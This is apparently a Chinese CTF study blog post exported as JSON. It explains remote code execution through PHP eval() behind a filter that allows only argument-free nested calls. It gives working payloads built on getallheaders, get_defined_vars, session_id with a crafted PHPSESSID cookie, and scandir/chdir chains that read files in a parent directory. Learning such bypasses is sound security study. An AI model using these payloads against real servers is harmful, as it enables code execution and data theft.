{"title":"无参数函数RCE","uid":"452153053cb456e93e9f321b6100ce19","slug":"无参数函数RCE","date":"2020-10-27T08:24:44.000Z","updated":"2020-10-27T13:33:46.000Z","comments":true,"path":"api/articles/无参数函数RCE.json","keywords":"A1andNS","cover":[],"content":"<p>最近做题遇到了无参数函数来RCE的题，这里记录一下一些想法，以备后来查证。</p>\n<p>这种题目的做法基本上就是，利用超级全局变量来进行bypass，利用函数的嵌套的替代参数的出现。然后进行任意文件读取。</p>\n<h2 id=\"无参数函数\"><a href=\"#无参数函数\" class=\"headerlink\" title=\"无参数函数\"></a>无参数函数</h2><p>通常来说如果在PHP中有一个语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>我们就可以利用cmd这个参数来getshell。</p>\n<p>但是很可惜的是cmd这个参数被做了过滤。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">';'</span> <span class=\"token operator\">===</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[^\\W]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>    \n    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>变成了这样后，如果我们使用参数就会出现问题，正则校验是无法通过的。这里可以去看一下[GXYCTF2019]禁止套娃，BUUOJ上有环境。</p>\n<p><code>/[^\\W]+\\((?R)?\\)/</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027163530749.png\" alt=\"image-20201027163530749\"></p>\n<p>如果输入的是system(‘ls’)这样的有参数函数，正则匹配就会匹配不到，从而没有替换为空，那么===’;’的条件就无法满足。</p>\n<p>只有<code>a();</code>、<code>a(b(c()));</code>这样的格式才能够被匹配。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027163830687.png\" alt=\"image-20201027163830687\"></p>\n<p>上面这个正则就是明显的过滤参数，只允许无参数函数的表现。</p>\n<h2 id=\"超级全局变量\"><a href=\"#超级全局变量\" class=\"headerlink\" title=\"超级全局变量\"></a>超级全局变量</h2><p>我们可以通过查阅PHP手册，找到很多超级全局变量。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。</p></blockquote>\n<pre class=\"line-numbers language-PHP\" data-language=\"PHP\"><code class=\"language-PHP\">PHP 超级全局变量列表:\n\n$GLOBALS\n\n$_SERVER\n\n$_REQUEST\n\n$_POST\n\n$_GET\n\n$_FILES\n\n$_ENV\n\n$_COOKIE\n\n$_SESSION<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>详细可以查看<a href=\"https://www.php.cn/php/php-superglobals.html\">https://www.php.cn/php/php-superglobals.html</a></p>\n<p>这里面有个有趣的超级全局变量<code>$_ENV</code></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>$_ENV数组中的内容是在php解析器运行时，从php所在服务器中的环境变量转变为php全局变量的,可以认为它就是一个环境变量的集合</p></blockquote>\n<p>这里有一个和$_ENV有关的一个函数getenv(),官方手册对它的介绍是</p>\n<p><a href=\"https://www.php.net/manual/en/function.getenv.php\">https://www.php.net/manual/en/function.getenv.php</a></p>\n<h2 id=\"getenv\"><a href=\"#getenv\" class=\"headerlink\" title=\"getenv()\"></a>getenv()</h2><p><code>getenv(name)</code>所以我们可以利用这个函数获取一个名为name环境变量的值。 </p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027184405494.png\" alt=\"image-20201027184405494\"></p>\n<h3 id=\"array-rand\"><a href=\"#array-rand\" class=\"headerlink\" title=\"array_rand()\"></a>array_rand()</h3><p>这个会经常用到，作用是从数组中随机取出一个或多个单元。</p>\n<p><a href=\"https://www.php.net/manual/en/function.array-rand.php\">https://www.php.net/manual/en/function.array-rand.php</a></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"v\"</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'t'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n    \n结果：int(3)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这样就可以取出一个单元，但是这里返回的是键，而不是值。如果想要得到值，就可以用一个函数先处理一下。这就是下面要说的这个函数了。</p>\n<h3 id=\"array-flip\"><a href=\"#array-flip\" class=\"headerlink\" title=\"array_flip()\"></a>array_flip()</h3><p>这个函数的作用是交换数组中的键和值，这样原来的键就变成值了，而原来的值就变成键了。</p>\n<p><a href=\"https://www.php.net/manual/zh/function.array-flip.php%C2%B7%C2%B7\">https://www.php.net/manual/zh/function.array-flip.php··</a></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"v\"</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'t'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n    \n结果：\nstring(1) \"v\"\nstring(1) \"s\"\nstring(1) \"v\"\nstring(1) \"b\"\nstring(1) \"a\"\nstring(1) \"s\"\nstring(1) \"v\"\nstring(1) \"s\"\nstring(1) \"t\"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"localeconv\"><a href=\"#localeconv\" class=\"headerlink\" title=\"localeconv()\"></a>localeconv()</h3><p>这个函数也会经常被用到，因为这个函数会返回一些字符组成的数组，通过使用localeconv()和current()等数组操作函数结合，就可以做到读出某个字符。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\n    \n结果：string(1) \".\"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>经常被用来替代点符号<code>.</code></p>\n<h2 id=\"getallheaders\"><a href=\"#getallheaders\" class=\"headerlink\" title=\"getallheaders()\"></a>getallheaders()</h2><p>getenv()函数是用来获取环境变量的，而这个getallheaders则是用来获取http header的</p>\n<p><a href=\"https://www.php.net/manual/zh/function.getallheaders.php\">https://www.php.net/manual/zh/function.getallheaders.php</a></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\nvar_dump(getallheaders());\n?&gt;\n\n\n结果：\narray(13) &#123;\n  [&quot;Content-Length&quot;]&#x3D;&gt;\n  string(1) &quot;0&quot;\n  [&quot;Cookie&quot;]&#x3D;&gt;\n  string(85) &quot;_ga&#x3D;GA1.1.125883784.1603376093; Phpstorm-b0ddb94&#x3D;486c1e0a-aca9-446a-ad57-e43c4cbfd510&quot;\n  [&quot;Accept-Language&quot;]&#x3D;&gt;\n  string(47) &quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6&quot;\n  [&quot;Accept-Encoding&quot;]&#x3D;&gt;\n  string(17) &quot;gzip, deflate, br&quot;\n  [&quot;Sec-Fetch-Dest&quot;]&#x3D;&gt;\n  string(8) &quot;document&quot;\n  [&quot;Sec-Fetch-User&quot;]&#x3D;&gt;\n  string(2) &quot;?1&quot;\n  [&quot;Sec-Fetch-Mode&quot;]&#x3D;&gt;\n  string(8) &quot;navigate&quot;\n  [&quot;Sec-Fetch-Site&quot;]&#x3D;&gt;\n  string(4) &quot;none&quot;\n  [&quot;Accept&quot;]&#x3D;&gt;\n  string(124) &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;\n  [&quot;User-Agent&quot;]&#x3D;&gt;\n  string(131) &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36 Edg&#x2F;86.0.622.51&quot;\n  [&quot;Upgrade-Insecure-Requests&quot;]&#x3D;&gt;\n  string(1) &quot;1&quot;\n  [&quot;Host&quot;]&#x3D;&gt;\n  string(15) &quot;localhost:63342&quot;\n  [&quot;Content-Type&quot;]&#x3D;&gt;\n  string(0) &quot;&quot;\n&#125;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里如果我在http头部写入一些恶意函数会如何呢？</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">';'</span> <span class=\"token operator\">===</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[^\\W]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我这里添加一个头信息，然后可以看到果然出现了phpinfo()</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027190535392.png\" alt=\"image-20201027190535392\"></p>\n<p>更近一步，加上current()</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">string(10) &quot;phpinfo();&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>那么只要把var_dump改成eval()，那么是否phpinfo就会被执行了呢？答案是确实执行了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027190923761.png\" alt=\"image-20201027190923761\"></p>\n<p>试一下system命令，确实你的rce就开始了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027191025538.png\" alt=\"image-20201027191025538\"></p>\n<p>但是注意到这个函数是apache环境才能使用的，所以也是存在一定的局限性的。</p>\n<h2 id=\"get-defined-vars\"><a href=\"#get-defined-vars\" class=\"headerlink\" title=\"get_defined_vars()\"></a>get_defined_vars()</h2><p>为了解决上面的问题，就可以使用这个函数了</p>\n<p><a href=\"https://www.php.net/manual/zh/function.get-defined-vars.php\">https://www.php.net/manual/zh/function.get-defined-vars.php</a></p>\n<p>这个函数是返回由已经定义变量所组成的数组。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027191534840.png\" alt=\"image-20201027191534840\"></p>\n<p>它是返回这4个超级全局变量的数组</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$_GET\n$_POST\n$_FILES\n$_COOKIE<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>那么就可以利用这个特性通过post传参构造恶意代码或者get传参构造恶意代码。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027192059908.png\" alt=\"image-20201027192059908\"></p>\n<p>和之前的思路一样利用一些php的数组函数来提取想要的数据，这里如果不知道用上面函数好，可以去菜鸟教程或PHP手册查询array操作函数。</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/27/BlMrSf.png\" alt=\"image 20201027192202107\"></p>\n<p>POST同理：</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/27/BlMzp6.png\" alt=\"image 20201027192410489\"></p>\n<p>但是一般事情没有那么简单，会有过滤的，特别是post或cookie的传参就基本会有过滤，然后cookie也是一样的，毕竟要做校验。</p>\n<h2 id=\"session-id\"><a href=\"#session-id\" class=\"headerlink\" title=\"session_id()\"></a>session_id()</h2><p>这里我们就是从$_COOKIE下手了，session_id()函数是用来获取/设置 当前会话 ID。</p>\n<p><a href=\"https://www.php.net/manual/zh/function.session-id.php\">https://www.php.net/manual/zh/function.session-id.php</a></p>\n<p>可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么我们就有了新的思路</p>\n<p>在cookie处传入PHPSESSID就好了</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"_GET\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=></span>\n  <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"cmd\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=></span>\n    <span class=\"token keyword type-declaration\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">29</span><span class=\"token punctuation\">)</span> <span class=\"token string double-quoted-string\">\"var_dump(get_defined_vars());\"</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"_POST\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=></span>\n  <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"_COOKIE\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=></span>\n  <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"PHPSESSION\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=></span>\n    <span class=\"token keyword type-declaration\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token string double-quoted-string\">\"phpinfo();\"</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"_FILES\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=></span>\n  <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这个还是get_defined_vars()的结果，如果这里要利用就比较麻烦了因为它在倒数第二的位置上。</p>\n<p>这里有一个细节，<code>PHPSESSID=phpinfo()%2b</code>这样才行，因为<code>;</code>被当作分隔而不会被包含进去，使用url编码就好了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027200942295.png\" alt=\"image-20201027200942295\"></p>\n<p>也可以成功，但是payload的就没有那么好搞定了。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token argument-name\">http</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//test/?cmd=eval(current(next(array_reverse(get_defined_vars()))));</span>\n\n<span class=\"token argument-name\">Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token constant\">PHPSESSID</span><span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>b<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这是老办法，如果使用了session_id()就会不一样了。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token argument-name\">http</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//test/?cmd=eval(session_id(session_start()));</span>\n\n<span class=\"token argument-name\">Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token constant\">PHPSESSID</span><span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>b<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>就好了。</p>\n<h2 id=\"dirname-amp-chdir\"><a href=\"#dirname-amp-chdir\" class=\"headerlink\" title=\"dirname() &amp; chdir()\"></a>dirname() &amp; chdir()</h2><p>getcwd()函数可以用来获取当前目录</p>\n<p>scandir()函数可以用来读取目录</p>\n<p>dirname()函数可以跳到上一级目录。</p>\n<p>chdir()函数可以修改当前目录。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http://test/?exp=var_dump(getcwd());\n\nstring(33) \"F:\\SoftWare\\phpstudy_pro\\WWW\\tset\"\n=====================================================\n\nhttp://test/?exp=var_dump(dirname(getcwd()));\n\nstring(28) \"F:\\SoftWare\\phpstudy_pro\\WWW\"\n=====================================================\n\nhttp://test/?exp=var_dump(scandir(dirname(getcwd())));\n\narray(7) &#123; [0]=> string(1) \".\" [1]=> string(2) \"..\" [2]=> string(5) \"error\" [3]=> string(10) \"index.html\" [4]=> string(10) \"phpMyAdmin\" [5]=> string(3) \"src\" [6]=> string(4) \"tset\" &#125;\n=====================================================\n\n//读出了上一级目录的zh.php文件\nhttp://test/?cmd=show_source(end(scandir(dirname(chdir(dirname(getcwd()))))));\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//你找到我了</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flag&#123;A1andNS&#125;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这种考法，说到底就是再考PHP功底，看你的对PHP函数和操作的了解情况了。</p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p>[1]. <a href=\"https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE\">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE</a></p>\n<p>[2]. <a href=\"https://www.php.net/\">https://www.php.net/</a></p>\n","text":"最近做题遇到了无参数函数来RCE的题，这里记录一下一些想法，以备后来查证。 这种题目的做法基本上就是，利用超级全局变量来进行bypass，利用函数的嵌套的替代参数的出现。然后进行任意文件读取。 无参数函数通常来说如果在PHP中有一个语句 eval($_POST['cmd']); ...","link":"","photos":[],"count_time":{"symbolsCount":"5.9k","symbolsTime":"5 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":32,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"Bypass","slug":"Bypass","count":1,"path":"api/tags/Bypass.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">无参数函数</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%B6%85%E7%BA%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F\"><span class=\"toc-text\">超级全局变量</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#getenv\"><span class=\"toc-text\">getenv()</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#array-rand\"><span class=\"toc-text\">array_rand()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#array-flip\"><span class=\"toc-text\">array_flip()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#localeconv\"><span class=\"toc-text\">localeconv()</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#getallheaders\"><span class=\"toc-text\">getallheaders()</span></a></li><li class=\"toc-item 